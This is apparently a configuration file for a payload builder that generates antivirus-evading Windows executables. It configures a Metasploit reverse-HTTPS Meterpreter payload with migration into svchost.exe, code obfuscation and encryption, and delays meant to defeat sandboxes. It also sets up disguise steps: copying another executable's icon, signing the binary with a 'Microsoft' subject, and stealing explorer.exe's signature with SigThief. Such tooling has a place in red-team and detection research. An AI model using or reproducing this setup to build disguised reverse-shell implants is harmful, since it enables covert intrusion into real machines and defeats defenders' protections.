# Use strip.exe to remove debugging symbols
useStrip = 0

# Use peCloak to perform additional encoding on the binary
usePeCloak = 0
peCloakPath = 'C:\\Tools\\peCloak\\'

# Use ditto to copy details and icon from another exe into the binary
useDitto = 0
dittoPath = 'C:\\Tools\\ditto\\'
dittoExe = 'C:\\Windows\\system32\\setupugc.exe'

# Disabled due to lack of SHA-256 support Sign the executable with Mono's signcode
#useSigncode = 0
#signcodePath = 'C:\\Program Files\\Mono\\bin\\signcode.exe'
#certPVK = 'C:\\Tools\\openssl\\codesign.pvk'
#certSPC = 'C:\\Tools\\openssl\\codespc.spc'

# Sign the executable with Microsoft's signtool
useSigncode = 0
signcodePath = 'C:\\Program Files (x86)\\Windows Kits\\8.1\\bin\\x86\\signtool.exe'
signSubject = 'Microsoft'
signHash = 'sha256'
signCert = 'C:\\Tools\\openssl\\codesign.pfx'

# Steal a signature with SigThief
useSigThief = 0
sigThiefPath = 'C:\\Tools\\SigThief\\'
sigThiefExe = 'C:\\Windows\\explorer.exe'
sigThiefExeName = 'explorer.exe'

# Size of randomly generated variables
randomVarSize = 10

# Size of randomly generated function names
randomFuncSize = 15

# Number of randomly generated unused variables
paddingVars = 100

# Length of data for random unused variables
dataLen = 10000

# Encryption key and IV lengths
encKeyLen = 16
encIvLen = 16

# Timer delay to defeat sandboxes
heuristicTimerVar = 120

# Metasploit Meterpreter payload
msfmeterpreter = 'windows/meterpreter/reverse_https'

# Payload execution options
MsfOptions = {
  'PrependMigrate': 'true',
  'PrependMigrateProc': 'svchost.exe'
}

# Path to Metasploit Meterpreter payload generator
msfpath = 'c:/metasploit-framework/bin/'

# Metasploit Meterpreter payload generator command
msfvenom = 'msfvenom.bat'

# Enable DH generation to add additional delay for sandbox bypass
diffieDelay = 1

# DH parameter size - 1 for 1024bit, 2 for 2048
dhSize = 1

# Directory for source code generation
sourceDir = 'source'

# CryptoPP compiled library path
cryptLibPath = 'source\\cryptlib.lib'

# Directory to drop final executables
exeDir = 'exe'

# Visual Studio path
vsPath = 'C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Tools\\MSVC\\14.11.25503'

# Windows SDK Include path
sdkPathIncl = 'C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.16299.0\\um'

# Windows SDK Lib path
sdkPathLib = 'C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\10.0.16299.0\\um\\x86'

# Windows Kit Include path
kitPathIncl = 'C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.16299.0\\ucrt'

# Windows Kit Lib path
kitPathLib = 'C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\10.0.16299.0\\ucrt\\x86'

# Windows API
winApiIncl = 'C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.16299.0\\shared'

# VS MSVCRT LIBPATH
vsMsvcrtLib = 'C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Tools\\MSVC\\14.11.25503\\lib\\x86'

# VS Tools PATH
vsToolsPath = 'C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Tools\\MSVC\\14.11.25503\\bin\\Hostx86\\x86'